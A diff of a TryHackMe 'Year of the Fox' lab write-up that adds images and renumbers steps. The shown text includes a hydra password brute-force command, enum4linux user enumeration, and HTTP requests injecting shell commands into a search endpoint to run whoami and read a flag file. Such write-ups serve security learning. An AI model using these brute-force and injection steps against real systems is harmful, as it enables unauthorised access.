@@ -5,7 +5,10 @@ summary: This is the summary for an awesome post.
 tags: tryhackme, writeup
 
 ## Overview
-This is a writeup for TryHackMe VM [Year of the Fox](https://tryhackme.com/room/yotf). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
+This is a writeup for TryHackMe VM [Year of the Fox](https://tryhackme.com/room/yotf). Here are stats for this machine from [machinescli](https://github.com/7h3rAm/machinescli):
+![writeup.overview.machinescli](/static/files/posts_thm_yotf/machinescli.png.webp)
+
+Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
 ### Killchain
 ![writeup.overview.killchain](/static/files/posts_thm_yotf/killchain.png.webp)
@@ -80,9 +83,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Wed Jul 29 19:55:04 2020 -- 1 IP address (1 host up) scanned in 56.96 seconds
 ```
 
-2\. We find `80/tcp` to be open and enumerate it further. The webapp enforces authentication due to which we are not allowed to view any pages. We will need to find the credentials for the web app to proceed with this further:  
+2\. Here a summary of open ports and their associated TTPs:
 
-3\. From the scan results SMB for ports, we find that there are two active users on this machine: `fox` and `rascal`  
+![writeup.enumeration.steps.2.1](/static/files/posts_thm_yotf/openports-ttps.png.webp)  
+
+3\. We find `80/tcp` to be open and enumerate it further. The webapp enforces authentication due to which we are not allowed to view any pages. We will need to find the credentials for the web app to proceed with this further:  
+
+4\. From the scan results SMB for ports, we find that there are two active users on this machine: `fox` and `rascal`  
 ```
 [+] Enumerating users using SID S-1-22-1 and logon username '', password ''
 S-1-22-1-1000 Unix User\fox (Local User)
@@ -104,24 +111,24 @@ No printers returned.
 enum4linux complete on Wed Jul 29 20:18:34 2020
 ```
 
-4\. We run a password bruteforce scan against the webapp for both usernames and find a hit:  
+5\. We run a password bruteforce scan against the webapp for both usernames and find a hit:  
 ```
 hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.41.240 http-head /
 ```
 
-![writeup.enumeration.steps.4.1](/static/files/posts_thm_yotf/screenshot01.png.webp)  
+![writeup.enumeration.steps.5.1](/static/files/posts_thm_yotf/screenshot01.png.webp)  
 
-5\. Upon logging in, we see a webpage with a search text box try out a few queries. Submitting an empty string shows a listing of 3 files. We setup Burp proxy and start enumerating the search functionality further:  
+6\. Upon logging in, we see a webpage with a search text box try out a few queries. Submitting an empty string shows a listing of 3 files. We setup Burp proxy and start enumerating the search functionality further:  
 
-![writeup.enumeration.steps.5.1](/static/files/posts_thm_yotf/screenshot02.png.webp)  
+![writeup.enumeration.steps.6.1](/static/files/posts_thm_yotf/screenshot02.png.webp)  
 
-![writeup.enumeration.steps.5.2](/static/files/posts_thm_yotf/screenshot03.png.webp)  
+![writeup.enumeration.steps.6.2](/static/files/posts_thm_yotf/screenshot03.png.webp)  
 
-![writeup.enumeration.steps.5.3](/static/files/posts_thm_yotf/screenshot04.png.webp)  
+![writeup.enumeration.steps.6.3](/static/files/posts_thm_yotf/screenshot04.png.webp)  
 
-![writeup.enumeration.steps.5.4](/static/files/posts_thm_yotf/screenshot05.png.webp)  
+![writeup.enumeration.steps.6.4](/static/files/posts_thm_yotf/screenshot05.png.webp)  
 
-6\. We find a way to escape the search input and get command execution on the target machine:  
+7\. We find a way to escape the search input and get command execution on the target machine:  
 ```
 POST /assets/php/search.php HTTP/1.1
   Host: 10.10.41.240
@@ -138,9 +145,9 @@ POST /assets/php/search.php HTTP/1.1
   {"target":"\";whoami\n"}
 ```
 
-![writeup.enumeration.steps.6.1](/static/files/posts_thm_yotf/screenshot06.png.webp)  
+![writeup.enumeration.steps.7.1](/static/files/posts_thm_yotf/screenshot06.png.webp)  
 
-7\. We use this to triage the file system and find the first web flag file:  
+8\. We use this to triage the file system and find the first web flag file:  
 ```
 POST /assets/php/search.php HTTP/1.1
   Host: 10.10.41.240
@@ -157,7 +164,7 @@ POST /assets/php/search.php HTTP/1.1
   {"target":"\"cat ../../../web-flag.txt;\n"}
 ```
 
-![writeup.enumeration.steps.7.1](/static/files/posts_thm_yotf/screenshot07.png.webp)  
+![writeup.enumeration.steps.8.1](/static/files/posts_thm_yotf/screenshot07.png.webp)  
 
 ### Findings
 #### Open Ports
